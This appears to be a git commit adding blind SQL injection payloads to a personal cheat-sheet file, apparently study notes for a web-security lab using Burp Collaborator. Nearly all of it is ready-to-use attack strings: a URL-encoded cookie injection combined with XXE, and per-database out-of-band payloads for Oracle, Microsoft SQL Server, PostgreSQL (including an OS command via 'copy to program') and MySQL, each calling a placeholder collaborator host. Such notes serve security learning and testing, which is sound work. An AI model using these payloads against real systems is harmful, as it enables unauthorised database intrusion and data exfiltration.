91632aae4f35cb1b8c222ca4c6322951922db1fd
HTN <96134288+htn-dev@users.noreply.github.com>
2022-05-25 20:28:21 -0400

    Update out-of-band interaction.sql

--- Blind SQL injection/out-of-band interaction.sql
+++ Blind SQL injection/out-of-band interaction.sql
@@ -8,3 +8,23 @@
 --Modify the TrackingId cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:
     
 TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+
+'--You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator client to generate 
+--a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.
+
+--Oracle	The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
+SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+
+--The following technique works on fully patched Oracle installations, but requires elevated privileges:
+SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
+
+--Microsoft	
+exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
+
+--PostgreSQL	
+copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
+
+--MySQL	The following techniques work on Windows only:
+LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
+SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
